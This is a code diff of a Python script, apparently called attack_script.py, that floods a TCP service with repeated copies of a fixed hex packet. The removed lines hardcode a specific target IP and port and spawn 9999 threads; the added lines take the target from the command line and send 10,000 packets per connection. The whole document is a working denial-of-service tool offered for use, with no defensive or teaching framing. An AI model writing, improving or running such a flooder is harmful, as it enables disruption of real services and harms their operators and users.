@@ -1,36 +1,28 @@
 import socket
-import threading
+import time
+import sys
+def main(ip, port, num_connections):
+    packet = bytes.fromhex("F10400010900000001000000F2")
+    num_send_per_connection = 10000
 
-# إعدادات الاتصال (تم تحديد IP والمنفذ مسبقًا)
-ip = "5.223.46.86"  # عنوان IP الهدف
-port = 10009  # المنفذ الهدف
-num_connections = 9999  # عدد الاتصالات
-num_send_per_connection = 1000  # عدد الحزم المرسلة لكل اتصال
-
-# الحزمة التي سيتم إرسالها
-packet = bytes.fromhex("F10400010900000001000000F2")
-
-# دالة لتنفيذ الاتصال وإرسال الحزم
-def send_packets(ip, port, packet, num_send_per_connection):
-    try:
+    for _ in range(num_connections):
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-            s.connect((ip, port))
-            for i in range(num_send_per_connection):
-                s.sendall(packet)
-                print(f"Packet {i + 1} sent to {ip}:{port}")
-        print(f"[+] Successful connection to {ip}:{port}")
-    except Exception as e:
-        print(f"[-] Error: {e}")
+            try:
+                s.connect((ip, port))
+                
+                for _ in range(num_send_per_connection):
+                    s.sendall(packet)
+                
+                print(f"Done sending packets to {ip} <3")
+            except Exception as e:
+                print(f"Error: {e}")
 
-# تنفيذ الاتصالات باستخدام Threads
-threads = []
-for _ in range(num_connections):
-    thread = threading.Thread(target=send_packets, args=(ip, port, packet, num_send_per_connection))
-    threads.append(thread)
-    thread.start()
-
-# الانتظار حتى تنتهي جميع الـ Threads
-for thread in threads:
-    thread.join()
-
-print("Done sending packets.")
+            time.sleep(0)
+if __name__ == "__main__":
+    if len(sys.argv) != 4:
+        print("Usage: python attack_script.py <ip> <port> <num_connections>")
+        sys.exit(1)  
+    ip = sys.argv[1]
+    port = int(sys.argv[2])
+    num_connections = int(sys.argv[3])
+    main(ip, port, num_connections)
